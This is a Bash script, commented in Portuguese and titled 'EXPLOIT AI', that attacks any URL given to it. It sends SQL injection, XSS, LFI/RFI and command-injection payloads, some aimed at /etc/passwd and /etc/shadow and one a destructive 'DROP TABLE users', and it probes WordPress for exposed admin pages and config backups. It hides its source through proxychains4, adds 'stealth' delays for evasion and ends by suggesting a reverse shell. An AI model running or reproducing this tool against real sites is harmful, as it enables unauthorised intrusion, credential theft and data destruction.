#!/bin/bash
# EXPLOIT AI - Sistema inteligente de explora√ß√£o autom√°tica
echo "=== EXPLOIT AI - AUTONOMOUS EXPLOITATION ==="

TARGET="$1"
MODE="${2:-safe}"

if [ -z "$TARGET" ]; then
    echo "Uso: $0 <URL> [MODE]"
    echo "Modos: safe, aggressive, stealth"
    echo "Exemplo: $0 https://target.com aggressive"
    exit 1
fi

TIMESTAMP=$(date +%s)
TEMP_DIR="/tmp/exploit_ai_$TIMESTAMP"
mkdir -p "$TEMP_DIR"

echo "üéØ Target: $TARGET"
echo "ü§ñ Mode: $MODE"
echo "üìÅ Temp: $TEMP_DIR"

# Fun√ß√£o para logging inteligente
log_exploit() {
    local level="$1"
    local message="$2"
    local timestamp=$(date '+%H:%M:%S')
    
    case "$level" in
        "SUCCESS") echo "üéâ [$timestamp] $message" | tee -a "$TEMP_DIR/exploits.log" ;;
        "VULN") echo "‚ö†Ô∏è  [$timestamp] $message" | tee -a "$TEMP_DIR/exploits.log" ;;
        "INFO") echo "‚ÑπÔ∏è  [$timestamp] $message" | tee -a "$TEMP_DIR/exploits.log" ;;
        "ERROR") echo "‚ùå [$timestamp] $message" | tee -a "$TEMP_DIR/exploits.log" ;;
    esac
}

# Fun√ß√£o para detectar tecnologias
detect_technologies() {
    local url="$1"
    local tech_file="$TEMP_DIR/technologies.txt"
    
    log_exploit "INFO" "Detectando tecnologias em $url"
    
    # Headers
    headers=$(proxychains4 -q curl -s -I "$url" --connect-timeout 10 2>/dev/null)
    
    # Detectar servidor web
    server=$(echo "$headers" | grep -i "server:" | cut -d: -f2- | tr -d ' \r')
    if [ -n "$server" ]; then
        echo "SERVER:$server" >> "$tech_file"
        log_exploit "INFO" "Servidor detectado: $server"
    fi
    
    # Detectar linguagem
    powered_by=$(echo "$headers" | grep -i "x-powered-by:" | cut -d: -f2- | tr -d ' \r')
    if [ -n "$powered_by" ]; then
        echo "LANGUAGE:$powered_by" >> "$tech_file"
        log_exploit "INFO" "Linguagem detectada: $powered_by"
    fi
    
    # Detectar CMS
    content=$(proxychains4 -q curl -s "$url" --connect-timeout 15 2>/dev/null)
    
    if echo "$content" | grep -qi "wp-content\|wordpress"; then
        echo "CMS:WordPress" >> "$tech_file"
        log_exploit "INFO" "WordPress detectado"
        
        # Detectar vers√£o do WordPress
        wp_version=$(echo "$content" | grep -oP 'wp-includes/js/wp-emoji-release\.min\.js\?ver=\K[0-9.]+' | head -1)
        if [ -n "$wp_version" ]; then
            echo "WP_VERSION:$wp_version" >> "$tech_file"
            log_exploit "INFO" "WordPress vers√£o: $wp_version"
        fi
    fi
    
    if echo "$content" | grep -qi "joomla"; then
        echo "CMS:Joomla" >> "$tech_file"
        log_exploit "INFO" "Joomla detectado"
    fi
    
    if echo "$content" | grep -qi "drupal"; then
        echo "CMS:Drupal" >> "$tech_file"
        log_exploit "INFO" "Drupal detectado"
    fi
}

# Exploits SQL Injection inteligentes
exploit_sqli() {
    local url="$1"
    local sqli_file="$TEMP_DIR/sqli_results.txt"
    
    log_exploit "INFO" "Testando SQL Injection em $url"
    
    # Payloads inteligentes baseados no contexto
    local payloads=(
        "'"
        "1' OR '1'='1"
        "admin'--"
        "' UNION SELECT NULL--"
        "1' AND 1=1--"
        "1' AND 1=2--"
        "'; DROP TABLE users--"
        "1' OR 1=1#"
        "1' UNION SELECT user(),version(),database()--"
        "1' AND (SELECT COUNT(*) FROM information_schema.tables)>0--"
    )
    
    for payload in "${payloads[@]}"; do
        # Testar em par√¢metros GET
        response=$(proxychains4 -q curl -s "$url?id=$payload" --connect-timeout 10 2>/dev/null)
        
        # An√°lise inteligente da resposta
        if echo "$response" | grep -qi "mysql\|sql\|error\|warning\|fatal"; then
            log_exploit "VULN" "Poss√≠vel SQL Injection: $payload"
            echo "SQLI_FOUND:$payload" >> "$sqli_file"
            
            # Tentar extrair informa√ß√µes
            info_payload="1' UNION SELECT user(),version(),database()--"
            info_response=$(proxychains4 -q curl -s "$url?id=$info_payload" --connect-timeout 10 2>/dev/null)
            
            if echo "$info_response" | grep -oP '[0-9]+\.[0-9]+\.[0-9]+'; then
                log_exploit "SUCCESS" "SQL Injection confirmado! Dados extra√≠dos."
                echo "$info_response" >> "$sqli_file"
            fi
        fi
        
        # Delay para evas√£o
        sleep 1
    done
}

# Exploits XSS inteligentes
exploit_xss() {
    local url="$1"
    local xss_file="$TEMP_DIR/xss_results.txt"
    
    log_exploit "INFO" "Testando XSS em $url"
    
    local payloads=(
        "<script>alert('XSS')</script>"
        "javascript:alert('XSS')"
        "<img src=x onerror=alert('XSS')>"
        "';alert('XSS');//"
        "<svg onload=alert('XSS')>"
        "\"onmouseover=\"alert('XSS')\""
        "<iframe src=javascript:alert('XSS')></iframe>"
        "<body onload=alert('XSS')>"
    )
    
    for payload in "${payloads[@]}"; do
        # Testar em diferentes par√¢metros
        for param in "q" "search" "name" "comment" "message"; do
            response=$(proxychains4 -q curl -s "$url?$param=$payload" --connect-timeout 10 2>/dev/null)
            
            # Verificar se o payload foi refletido
            if echo "$response" | grep -F "$payload" >/dev/null; then
                log_exploit "VULN" "XSS Refletido encontrado: $param=$payload"
                echo "XSS_REFLECTED:$param=$payload" >> "$xss_file"
            fi
        done
        
        sleep 1
    done
}

# Exploits LFI/RFI inteligentes
exploit_lfi() {
    local url="$1"
    local lfi_file="$TEMP_DIR/lfi_results.txt"
    
    log_exploit "INFO" "Testando LFI/RFI em $url"
    
    local payloads=(
        "../../../etc/passwd"
        "..\\\\..\\\\..\\\\windows\\\\system32\\\\drivers\\\\etc\\\\hosts"
        "/etc/passwd"
        "C:\\\\windows\\\\system32\\\\drivers\\\\etc\\\\hosts"
        "php://filter/read=convert.base64-encode/resource=index.php"
        "data://text/plain;base64,PD9waHAgcGhwaW5mbygpOyA/Pg=="
        "/proc/version"
        "/etc/shadow"
    )
    
    for payload in "${payloads[@]}"; do
        for param in "file" "page" "include" "path" "doc"; do
            response=$(proxychains4 -q curl -s "$url?$param=$payload" --connect-timeout 10 2>/dev/null)
            
            # Verificar indicadores de LFI
            if echo "$response" | grep -qi "root:\|administrator\|kernel\|windows"; then
                log_exploit "SUCCESS" "LFI confirmado: $param=$payload"
                echo "LFI_FOUND:$param=$payload" >> "$lfi_file"
                echo "$response" | head -10 >> "$lfi_file"
            fi
        done
        
        sleep 1
    done
}

# Exploits Command Injection inteligentes
exploit_cmd_injection() {
    local url="$1"
    local cmd_file="$TEMP_DIR/cmd_results.txt"
    
    log_exploit "INFO" "Testando Command Injection em $url"
    
    local payloads=(
        "; whoami"
        "| whoami"
        "&& whoami"
        "; id"
        "| id"
        "&& id"
        "; uname -a"
        "| uname -a"
        "; cat /etc/passwd"
        "| cat /etc/passwd"
    )
    
    for payload in "${payloads[@]}"; do
        for param in "cmd" "command" "exec" "system" "ping" "host"; do
            response=$(proxychains4 -q curl -s "$url?$param=test$payload" --connect-timeout 15 2>/dev/null)
            
            # Verificar indicadores de execu√ß√£o
            if echo "$response" | grep -qi "uid=\|gid=\|root\|administrator\|kernel"; then
                log_exploit "SUCCESS" "Command Injection confirmado: $param=test$payload"
                echo "CMD_INJECTION:$param=test$payload" >> "$cmd_file"
                echo "$response" | head -10 >> "$cmd_file"
            fi
        done
        
        sleep 2
    done
}

# Exploits espec√≠ficos para WordPress
exploit_wordpress() {
    local url="$1"
    local wp_file="$TEMP_DIR/wordpress_results.txt"
    
    log_exploit "INFO" "Executando exploits espec√≠ficos do WordPress"
    
    # Testar wp-admin sem autentica√ß√£o
    wp_admin_response=$(proxychains4 -q curl -s "$url/wp-admin/" --connect-timeout 10 2>/dev/null)
    if ! echo "$wp_admin_response" | grep -qi "login\|password"; then
        log_exploit "VULN" "wp-admin acess√≠vel sem autentica√ß√£o"
        echo "WP_ADMIN_OPEN" >> "$wp_file"
    fi
    
    # Testar xmlrpc.php
    xmlrpc_response=$(proxychains4 -q curl -s -X POST "$url/xmlrpc.php" \
        -H "Content-Type: text/xml" \
        -d "<?xml version=\"1.0\"?><methodCall><methodName>system.listMethods</methodName></methodCall>" \
        --connect-timeout 10 2>/dev/null)
    
    if echo "$xmlrpc_response" | grep -qi "methodResponse"; then
        log_exploit "VULN" "xmlrpc.php ativo - poss√≠vel brute force"
        echo "WP_XMLRPC_ACTIVE" >> "$wp_file"
    fi
    
    # Testar wp-config.php backup
    for backup in "wp-config.php.bak" "wp-config.php~" "wp-config.php.old"; do
        backup_response=$(proxychains4 -q curl -s "$url/$backup" --connect-timeout 10 2>/dev/null)
        if echo "$backup_response" | grep -qi "DB_PASSWORD\|DB_USER"; then
            log_exploit "SUCCESS" "wp-config.php backup encontrado: $backup"
            echo "WP_CONFIG_BACKUP:$backup" >> "$wp_file"
        fi
    done
}

# Fun√ß√£o principal de explora√ß√£o
main_exploitation() {
    local url="$TARGET"
    
    # Detectar tecnologias primeiro
    detect_technologies "$url"
    
    # Executar exploits baseados no modo
    case "$MODE" in
        "safe")
            log_exploit "INFO" "Modo SAFE - Exploits n√£o-destrutivos"
            exploit_sqli "$url" &
            exploit_xss "$url" &
            exploit_lfi "$url" &
            ;;
            
        "aggressive")
            log_exploit "INFO" "Modo AGGRESSIVE - Todos os exploits"
            exploit_sqli "$url" &
            exploit_xss "$url" &
            exploit_lfi "$url" &
            exploit_cmd_injection "$url" &
            
            # Se WordPress detectado
            if grep -q "WordPress" "$TEMP_DIR/technologies.txt" 2>/dev/null; then
                exploit_wordpress "$url" &
            fi
            ;;
            
        "stealth")
            log_exploit "INFO" "Modo STEALTH - Exploits com delays"
            exploit_sqli "$url"
            sleep 30
            exploit_xss "$url"
            sleep 30
            exploit_lfi "$url"
            ;;
    esac
    
    # Aguardar todos os exploits
    wait
}

# Executar explora√ß√£o
echo -e "\nü§ñ Iniciando explora√ß√£o autom√°tica..."
main_exploitation

# Gerar relat√≥rio final
echo -e "\nüìä Gerando relat√≥rio de explora√ß√£o..."

FINAL_REPORT="$TEMP_DIR/EXPLOITATION_REPORT.txt"

cat > "$FINAL_REPORT" <<EOF
EXPLOIT AI - RELAT√ìRIO DE EXPLORA√á√ÉO
====================================
Target: $TARGET
Mode: $MODE
Timestamp: $(date)

TECNOLOGIAS DETECTADAS:
EOF

if [ -f "$TEMP_DIR/technologies.txt" ]; then
    cat "$TEMP_DIR/technologies.txt" >> "$FINAL_REPORT"
fi

echo -e "\nVULNERABILIDADES ENCONTRADAS:" >> "$FINAL_REPORT"

# Consolidar vulnerabilidades
vuln_count=0

for vuln_file in "$TEMP_DIR"/*_results.txt; do
    if [ -f "$vuln_file" ]; then
        vuln_type=$(basename "$vuln_file" _results.txt)
        echo -e "\n[$vuln_type]" >> "$FINAL_REPORT"
        cat "$vuln_file" >> "$FINAL_REPORT"
        vuln_count=$((vuln_count + $(wc -l < "$vuln_file")))
    fi
done

echo -e "\nESTAT√çSTICAS:" >> "$FINAL_REPORT"
echo "- Vulnerabilidades encontradas: $vuln_count" >> "$FINAL_REPORT"
echo "- Tempo de execu√ß√£o: $SECONDS segundos" >> "$FINAL_REPORT"

# Mostrar resultado
echo -e "\nüéØ EXPLORA√á√ÉO CONCLU√çDA!"
cat "$FINAL_REPORT"

if [ $vuln_count -gt 0 ]; then
    echo -e "\n‚ö†Ô∏è  VULNERABILIDADES ENCONTRADAS: $vuln_count"
    echo "üìÅ Detalhes em: $TEMP_DIR"
else
    echo -e "\n‚úÖ Nenhuma vulnerabilidade √≥bvia encontrada"
fi

# Sugest√µes autom√°ticas
echo -e "\nüí° PR√ìXIMOS PASSOS:"
if grep -q "SQLI_FOUND" "$TEMP_DIR"/*.txt 2>/dev/null; then
    echo "   ‚Üí Usar sqlmap para explora√ß√£o avan√ßada de SQL Injection"
fi

if grep -q "WP_" "$TEMP_DIR"/*.txt 2>/dev/null; then
    echo "   ‚Üí Usar wpscan para explora√ß√£o espec√≠fica do WordPress"
fi

if grep -q "CMD_INJECTION" "$TEMP_DIR"/*.txt 2>/dev/null; then
    echo "   ‚Üí Estabelecer reverse shell via Command Injection"
fi